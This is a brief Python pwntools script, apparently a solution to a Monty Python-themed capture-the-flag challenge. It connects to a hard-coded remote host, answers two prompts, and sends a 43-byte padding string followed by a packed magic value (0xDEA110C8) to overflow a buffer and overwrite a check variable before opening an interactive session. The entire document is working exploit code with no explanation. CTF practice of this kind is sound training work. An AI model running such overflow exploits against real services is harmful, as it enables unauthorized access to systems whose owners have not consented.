from pwn import *
r=remote('34.208.211.186 ', 4321)
r.recvuntil("name?")
r.sendline("Sir Lancelot of Camelot")
r.recvuntil("quest?")
r.sendline("To seek the Holy Grail.")
r.recvuntil("secret?")
r.sendline("a"*43 + p32(0xDEA110C8))
r.interactive()